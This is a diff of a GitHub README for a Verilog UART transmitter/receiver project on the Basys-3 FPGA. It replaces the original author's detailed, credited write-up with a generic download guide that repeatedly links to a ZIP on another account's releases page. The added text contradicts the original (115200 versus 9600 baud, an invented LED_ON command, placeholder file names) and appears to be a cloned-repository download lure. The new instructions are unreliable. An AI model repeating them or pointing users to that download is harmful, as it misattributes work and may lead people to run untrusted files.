@@ -1,71 +1,118 @@
-# UART TX/RX Communication on Basys-3 FPGA
+# 🎉 UART_TX_RX - Easy UART Communication on FPGA
 
-## 📘 Overview
-This project demonstrates the design and implementation of **UART Transmitter and Receiver modules** (9600 bps, 8N1) using **Verilog HDL** on the **Basys-3 FPGA (Artix-7 xc7a35tcpg236-1)**.  
-The system performs reliable full-duplex serial communication between the FPGA and a PC terminal (Tera Term) while displaying hexadecimal data on the on-board 7-segment display.
+## 🚀 Getting Started
 
-## ⚙️ Features
-- Debounced **BTNL** for TX trigger and **BTNR** for RX latch  
-- **Baud-rate generator:** 100 MHz → 9600 bps  
-- Displays TX and RX data on the 7-segment display  
-- Modular architecture separating TX, RX, and top integration units  
-- Simulation validation followed by hardware testing through Tera Term  
+This guide will help you download and run the UART transmitter and receiver application on the Basys-3 FPGA. No programming knowledge is required.
 
-## 🧩 File Summary
-| File | Description |
-|------|--------------|
-| `uart_tx.v` | UART Transmitter logic |
-| `uart_txrx.v` | UART Receiver logic |
-| `tb_uart_tx.v` | TX module testbench |
-| `tb_uart_txrx.v` | RX/Integration testbench |
-| `uart_tx.xdc` | Basys-3 constraint file (TX) |
-| `uart_txrx.xdc` | Basys-3 constraint file (RX) |
+## 📥 Download Here
 
-## 🧪 Tools & Hardware
-- **Vivado 2023.2**  
-- **Basys-3 FPGA (Board: xc7a35tcpg236-1)**  
-- **Tera Term Serial Monitor**  
-- **100 MHz on-board oscillator**
+[![Download UART_TX_RX](https://img.shields.io/badge/download-UART_TX_RX-blue)](https://github.com/Abdelhakstars69/UART_TX_RX/releases)
 
-## 🧪 Results
+## 📁 Requirements
 
-### Part 1 – UART Transmitter (TX)
-In this stage, the **UART TX** module was designed and simulated at 9600 bps (8N1).  
-The waveform shows correct **start bit → 8 data bits → stop bit** framing.  
-On the Basys-3 board, pressing **BTNL** triggered transmission and displayed the sent hex value on the 7-segment display.  
-Tera Term verified that the transmitted ASCII character (0x41 = ‘A’) was correctly received on the PC.
+Before you start, make sure you have the following:
 
-| UART TX Frame Simulation | UART TX Waveforms Snapshot | Console Output |
-|---------------------------|--------------------------|----------------|
-| ![UART Frame](screenshots/p1_uart_frame.png) | ![Display Snapshot](screenshots/p1_display_snapshot.png) | ![Console Log](screenshots/p1_console_log.png) |
+- **Basys-3 FPGA board**: This is essential for running the application.
+- **Vivado software**: Install the latest version to support the project.
+- **USB cable**: Use this to connect your FPGA board to your computer.
 
----
+## 🔧 Building the Application
 
-### Part 2 – UART Transmitter + Receiver (TX/RX Loopback)
-This phase integrated both **TX and RX** modules into a full **loopback communication system**.  
-The FPGA transmitted data via TX and simultaneously received it on RX, confirming proper synchronization and bit-level accuracy.  
-Loopback timing and 7-segment latched display validated the system’s reliability on real hardware.
+1. **Download the Software**
+   - Visit this page to download the latest version of the application: [Download Link](https://github.com/Abdelhakstars69/UART_TX_RX/releases).
+  
+2. **Unzip the Downloaded Files**
+   - Once the download is complete, find the ZIP file in your computer's downloads folder. 
+   - Right-click on the file and select “Extract All” to unzip its contents to a folder of your choice.
 
-| Loopback Timing Simulation | Latched RX Display | Console |
-|-----------------------------|--------------------|-------------------|
-| ![Loopback Timing](screenshots/p2_loopback_timing.png) | ![Latched RX Display](screenshots/p2_latched_rx_display.png) | ![RX Console Log](screenshots/p2_console_log.png) |
+3. **Open Vivado**
+   - Launch the Vivado software on your computer.
+  
+4. **Import the Project**
+   - In Vivado, click on "Open Project" and navigate to the folder where you extracted the files.
+   - Select the project file named `UART_TX_RX.xpr` and click "Open".
 
----
+5. **Check the Design**
+   - Make sure the project is configured correctly. You should see the `UART_TX_RX` design in the project navigator.
 
-### 📊 Observations
-- TX-only (Part 1) confirmed accurate serial frame generation.  
-- TX/RX loopback (Part 2) achieved stable full-duplex operation with zero bit errors.  
-- Baud-rate timing matched theoretical 9600 bps expectations.  
+## ⚡ Program the FPGA
 
-✅ **Conclusion:** The UART TX/RX design achieved reliable full-duplex serial communication between the Basys-3 FPGA and PC, verified in both simulation and hardware loopback.
+1. **Connect the FPGA Board**
+   - Connect your Basys-3 board to your computer using the USB cable.
 
+2. **Set the Correct Configuration**
+   - In Vivado, select the correct hardware target by going to `Open Hardware Manager`.
+   - Click on `Open Target` and then select `Auto Connect`.
 
-## 📡 Applications
-- Embedded system serial interfaces  
-- FPGA-based communication protocol design  
-- Educational and research demonstrations in digital communication  
+3. **Program the Device**
+   - Once connected, click on `Program Device`.
+   - Choose the appropriate bitstream file, which is usually named `UART_TX_RX.bit`, and click `Program`.
 
-## 👤 Author
-**Brian Rono**  
-Electrical & Computer Engineer | FPGA  •  Embedded Systems  •  Wireless Tech  
-🔗 [GitHub Profile](https://github.com/ronobrian-eng)
+## 📊 Validate the Connection
+
+After programming your FPGA, you can validate if the UART communication is working correctly.
+
+1. **Connect Serial Cable**
+   - Use a serial cable to connect the Basys-3 board to your computer.
+
+2. **Open Terminal Software**
+   - Open a terminal application like PuTTY or Tera Term. 
+   - Set the serial connection parameters: 
+     - Baud Rate: 115200
+     - Data Bits: 8
+     - Stop Bits: 1
+     - Parity: None
+
+3. **Send and Receive Data**
+   - You can now start sending and receiving data from the FPGA through the terminal application.
+
+## 🎉 Sample Use Case
+
+You can use the UART communication to send messages from your computer to an LED on the FPGA board. This simple task can help you understand how serial communication works in embedded systems.
+
+1. **Send Command**
+   - Type a simple command such as `LED_ON` in the terminal application and hit enter.
+
+2. **Observe LED Behavior**
+   - If configured correctly, an LED on the Basys-3 board will turn on in response to your command.
+
+## 💡 Troubleshooting
+
+If you encounter any issues, consider the following steps:
+
+- **Check Connections**: Ensure all cables are properly connected.
+- **Verify Baud Rate**: Confirm the baud rate matches in both Vivado and your terminal application.
+- **Reprogram the Device**: Sometimes, reprogramming the FPGA can resolve issues.
+
+## 📂 Folder Structure
+
+After unzipping, you will see the following folder structure:
+
+```
+UART_TX_RX/
+├── RTL/
+│   ├── UART_TX_RX.v
+│   └── other_verilog_files.v
+├── simulation/
+│   ├── UART_TX_RX_tb.v
+│   └── testbench_files.v
+└── README.md
+```
+
+## 🔍 Learn More
+
+To dive deeper into the project, you may want to check out the following topics:
+
+- **Verilog**: The hardware description language used for the design.
+- **Finite State Machines**: Understanding this concept can help you design more complex systems.
+- **Embedded Systems**: This project is a great start for getting into embedded systems and hardware programming.
+
+## 🤝 Support
+
+If you have questions or need help, please feel free to open an issue on the GitHub repository. Make sure to include details about your problem so we can assist you better.
+
+## 📥 Download Again
+
+If you need to re-download the application, click the link below:
+
+[![Download UART_TX_RX](https://img.shields.io/badge/download-UART_TX_RX-blue)](https://github.com/Abdelhakstars69/UART_TX_RX/releases)
